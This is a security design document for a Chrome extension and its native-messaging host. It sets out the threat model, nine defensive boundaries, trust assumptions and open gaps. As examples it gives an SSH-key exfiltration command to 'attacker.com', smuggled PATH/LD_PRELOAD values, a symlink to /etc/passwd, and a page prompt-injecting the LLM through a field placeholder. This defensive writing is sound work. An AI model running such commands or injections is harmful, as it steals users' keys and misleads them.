# Chrome Security Model

The chrome integration runs as a content script inside arbitrary web
pages, talks to a local native-messaging host that watches `~/.cues/`
and spawns subprocesses, and exposes that capability to any blank the
user has authored. This doc walks through what we defend against,
what we explicitly trust, and what's still open.

## Threat model

The actor we're defending against is a **hostile web page** the user
visits. Their goal is to trigger an OpenCues capability without the
user's intent — e.g. silently change system volume, exfiltrate via a
user-authored script, etc.

The actor we **trust** is the user. Anything in `~/.cues/` was put
there by the user (or by an LLM the user authorised to write files
via CC/OC). Scripts in `.cues/blanks/<name>/<name>.sh` run with full
user privileges, like any shell command the user could run themselves.

## Boundaries that hold

### Boundary 1 — Chrome ↔ native-messaging host

The host's manifest declares `allowed_origins: [chrome-extension://<id>]`.
Only the specific extension we registered can open the native port.
Other extensions, web pages, and processes cannot.

The `<id>` is captured at install time (`opencues install chrome-host
--extension-id <id>`) and pinned in the manifest + (on Windows) the
HKCU registry.

### Boundary 2 — Trust gate (credit-based underscore accounting)

Blanks fire on `_`. To stop a hostile page from injecting `_`:

- **Layer 1**: input events with `isTrusted === false` are dropped at
  source. Blocks `dispatchEvent(new InputEvent(...))` outright.
- **Layer 2**: credit-based. Each trusted `_` introduction (real
  keydown of `_`, paste/drop containing `_`) adds 1 credit per
  underscore. Each accepted user-classified text-change consumes
  credits equal to the increase in `_` count. Changes whose delta
  exceeds available credits are silently dropped.

Layer 2 specifically defeats the **blessed-window attack** —
`execCommand('insertText', false, '_')` produces an `isTrusted=true`
input event with no preceding `_` keystroke, defeating naive
timestamp gates. The credit accounting ensures every legitimate `_`
keystroke authorises exactly one underscore insertion; replays must
re-earn credit.

Runtime writes (source='runtime' after `sourceReclassifier`) bypass
the gate and reset the baseline — necessary for transform-blanks
that emit `snake_case` text long after the user typed the trigger.

Pinned by `integrations/chrome/src/trust-gate.test.ts` (15 tests).

### Boundary 3 — Site allow/deny scoping

Frontmatter `on-site` / `not-on-site` lets each cue/blank/auditor
scope itself to specific sites:

```yaml
on-site: [reddit.com, *.reddit.com, reddit.com/r/claudeai]
not-on-site: [evil.example, claude.ai]
```

Entries can be platform names (`chrome`, `claude-code`, `cc`,
`opencode`, `oc`, `gemini-cli`, `gemini`), exact hostnames,
wildcard hostnames, or hostname-with-path-prefix patterns.

Chrome applies the filter at bundle-read time in
`applySiteCompatFilter` (see `src/site-filter.ts`). Entries that
don't match the current location never reach the runtime — the
runtime can't fire what it doesn't know about. SPA navigation
re-triggers the filter via `popstate` plus monkey-patched
`pushState` / `replaceState`.

For destructive blanks (anything taking free-form args that acts on
the system), pair an explicit `on-site` allow-list with the trust
gate — defence in depth.

Pinned by `integrations/chrome/src/site-filter.test.ts` (23 tests).

### Boundary 4 — Host path sandbox

Every script the host runs must resolve to a path under `CUE_ROOT`
(`~/.cues/` or `$OPENCUES_HOME`). Three input shapes:

1. Chrome-runtime virtual paths (`/chrome-storage/.cues/...`) →
   translate to `${CUE_ROOT}/...`.
2. Absolute filesystem paths → resolve and check directly.
3. Non-path args (plain words, flags) → pass through unchanged.

The check uses `fs.realpathSync` to resolve every symlink along the
path before the boundary check. A symlink at
`~/.cues/blanks/evil/script.sh -> /etc/passwd` is refused (exit 126
`arg outside CUE_ROOT`) — realpath returns the underlying target
which fails the check, even though the symlink itself sits inside
`CUE_ROOT`.

`integrations/chrome/host/host.cjs:sandboxArg`.

### Boundary 5 — Env-key whitelist

The host accepts env vars from the message only when the key matches
`/^CUES_[A-Z0-9_]+$/`. A malicious frontmatter that tried to smuggle
`PATH=/tmp/evil:/bin` (or `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, …)
through `msg.env` is filtered out before spawn — only the well-known
CUES_* prefix (model, API URL, etc.) survives.

`integrations/chrome/host/host.cjs:filterMessageEnv`.

### Boundary 6 — Per-call timeout

Every exec has a default 10s timeout in the host (configurable per
call). The SW adds a 5s safety net above that. No script can hang
the host or the extension indefinitely.

### Boundary 7 — User-blank capability gate (host-side execution)

`impl: ./blank.js` blanks run on the **chrome-host** (Node process
connected via native messaging), NOT in a content-script Worker. The
host imports `@opencues/runtime`'s `buildUserBlankRegistry` — the
same loader CC/OC/gemini use — which runs the blank's JS inside Node's
`vm` with a permission proxy. The content script holds only a thin
proxy (`ChromeUserBlank` in `integrations/chrome/src/user-blank-loader.ts`)
that round-trips invokes over the native port.

Why host-side, not Worker:
1. **No page-CSP coupling** — strict pages (Gmail, banks) refuse
   `new Worker(blob:...)` from content scripts. Host-side bypasses
   page CSP entirely.
2. **Stronger sandbox** — Node `vm` + permission proxy is the same
   isolation the CLI hosts use. The browser Worker model was weaker
   (no DOM, but full network).
3. **One loader, four hosts** — chrome aligns with CC/OC/gemini
   instead of carrying its own AST rewriter + Worker harness.

What the host-side blank sees:
- `ctx.fetch` / `ctx.llm` / `ctx.storage` / `ctx.secrets` only when
  declared in BLANK.md frontmatter; everything else is `undefined`.
- Per-blank quotas (120 fetches/min, 30 LLM/min, 1MB storage) with
  hard ceilings (600/120/10MB).
- `ctx.storage` lives at `CUE_ROOT/.user-blank-storage/<namespace>/`
  (disk, host-side). No round-trip to chrome.storage.
- Output passes through `sanitizeBlankOutput` at the host before it
  reaches the wire, AND again on the content-script side before
  reaching the DOM. Defence in depth.

**Hard dependency**: custom user-blanks (`impl: ./blank.js`)
require `opencues install chrome-host`. Without the host, the
proxy's invoke fails with "native host not connected" — same fail
shape as scripted blanks without the host. Shipped TS-class blanks
(weather, stocks, answer, prompt, …) register upstream in
`createBlanks()` and don't need the host.

See `docs/architecture/user-blanks.md` for the full capability
surface and the author's view.

### Boundary 8 — Per-secret host binding

A blank that declares `secrets: [GROQ_API_KEY]` MUST also declare
`secret-hosts.GROQ_API_KEY: [api.groq.com]`. Unbound secrets are
refused at load time. When `ctx.fetch` (or `ctx.llm`) is about to
send a request, the runtime scans the URL, headers, and body for
the bound secret value; if found, the target hostname must be in
the secret's allow-list, else the request is refused.

This closes the "declare benign-looking network capability, smuggle
secret out" exfiltration path. Example refused request:

```
ctx.fetch: secret "GROQ_API_KEY" is bound to [api.groq.com],
cannot be sent to "evil.com"
```

Pinned by `packages/opencues-runtime/src/user-blanks/secret-leak-guard.test.ts`
(11 tests).

### Boundary 9 — Ambient-context scope + gate

Chrome's `gatherAmbientContext` (in `src/opencues-bootstrap.ts`)
collects field-level metadata (`label`, `placeholder`, `aria-*`,
`inputType`) plus three page-level fields (`pageTitle`,
`pageUrl` reduced to origin+path, `pageDescription`) for the
currently focused field. It explicitly does NOT read:

- Any sibling field's value or label.
- The query string or fragment of the URL.
- Cookies, localStorage, sessionStorage.
- Any other DOM outside the focused field's attributes and the
  page-level `<title>` / `<meta name="description">` / `location`.

Sensitive fields (password / CC / OTP / fields with
`autocomplete=off` / `name`-id matching `/password|cvv|ssn|pin|otp|secret|token|api[_-]?key|auth/`)
return `null` regardless of the feature gate.

The runtime never asks the host for ambient context unless
`ambient-context-mode: on` is set in `~/.cues/OPENCUES.md`
(off by default). Three layers of off-by-default — see
`docs/architecture/ambient-context.md`.

The structural property the model leans on: OpenCues has no
tool / exec layer that consumes fluid-blank LLM output. Worst
case if a page injects a prompt into its own `placeholder`,
the LLM emits misleading text into the user's buffer, which
the user sees before submitting. There is no parallel channel
to exfiltrate to. **If you ever wire fluid-blank output into a
side-effect layer, the ambient-context threat model must be
re-reviewed before that change lands.**

## Trust assumptions (NOT boundaries — user responsibility)

### Cue-pack trust

Scripts in `~/.cues/blanks/<name>/<name>.sh` run with the user's
permissions. There's no sandbox between a script and the user's
filesystem, network, or processes. A malicious cue pack with `curl
~/.ssh/id_rsa attacker.com` would exfiltrate the SSH key.

**Treat `~/.cues/` like `.bashrc`** — only install packs you trust.
This isn't a chrome-specific concern; the same model applies to
CC, OC, and gemini-cli.

### Manifest writeability

The Windows-side host registration writes to `%LOCALAPPDATA%\opencues\`
and `HKCU\Software\Google\Chrome\NativeMessagingHosts\`. These are
per-user paths. Anyone with write access to those locations (same
user account, root, etc.) can modify the host binary. Standard OS
trust.

### Devtools self-pwn

A user with the page's devtools open can run `chrome.storage.local
.set({opencues_bundle: ...maliciousBundle})` and the bootstrap will
process the new bundle. But: the host's path sandbox still applies,
so the maximum damage is "the runtime tries to run a script that
turns out not to exist." Not a meaningful escalation path.

## Known gaps / future work

### Auditor inputs

Auditors take the user's draft as LLM input. An auditor written by
a malicious cue pack could route the draft through an attacker-
controlled LLM endpoint or exfiltrate it. The endpoint choice lives
in OPENCUES.md frontmatter; we could validate at config-load time
that auditor endpoints are on a known list. Tracked but low
priority since the auditor scope is itself trusted code.

### Streaming exec

Current protocol is request/response — no stdout streaming until
the script closes. Long-running scripts buffer everything in
memory. A streaming variant (`exec-chunk` message) would unlock
log-tail and watch-style blanks; defer until there's a concrete use.

### Same-origin iframe trust

The trust gate state is shared across same-origin iframes within a
tab. If a host page (e.g. `mail.google.com`) embeds an attacker-
controlled iframe at the same origin (which shouldn't happen but
sometimes does via misconfigured proxies), the iframe's `_`
credits accumulate alongside the host's. Mitigations: per-frame
gate state, or refusing to bind in iframes whose `window.top !==
window`. Tracked here as a residual; see audit doc row #13.

## Resolved gaps (historical)

- **Audit log** — host now writes to `~/.cues/.host-log`
  (timestamped command/args/exit/duration).
- **Rate limiting** — user-blank quota tracker caps fetch + LLM
  rates per blank; `blankScript:` invocations still rely on the
  per-call timeout but pathological loops would need a multi-blank
  attack to scale.
- **API key in bundle** — esbuild defines resolve to `''`; keys
  come from popup or the native-messaging host's `config` message
  at connect time. The published bundle is grep-free of secrets.

## What's pinned by tests

| Boundary | Test file | Tests |
|---|---|---|
| Trust gate | `integrations/chrome/src/trust-gate.test.ts` | 15 |
| Site filter | `integrations/chrome/src/site-filter.test.ts` | 23 |
| `inferSiteCompat` core | `packages/opencues-core/src/host-compat.test.ts` | 9 |
| Path sandbox | manual smoke (`/etc/passwd`, symlink, traversal) | 3 |
| ESM AST rewriter | `packages/opencues-runtime/src/user-blanks/esm-rewrite.test.ts` | 13 |
| Secret-binding leak guard | `packages/opencues-runtime/src/user-blanks/secret-leak-guard.test.ts` | 11 |
| User-blank loader (Node) | `packages/opencues-runtime/src/user-blanks/node-loader.test.ts` | 19 |
| Sandbox-runner (bwrap) | `packages/opencues-runtime/src/security/sandbox-runner.test.ts` | 21 |
| Sandbox-runner (bwrap, real exec) | `packages/opencues-runtime/src/security/sandbox-runner.integration.test.ts` | 9 |
| Sandbox-exec (macOS) + dispatcher | `packages/opencues-runtime/src/security/sandbox-exec.test.ts` | 14 |

Anything new touching these surfaces needs its assertion added.
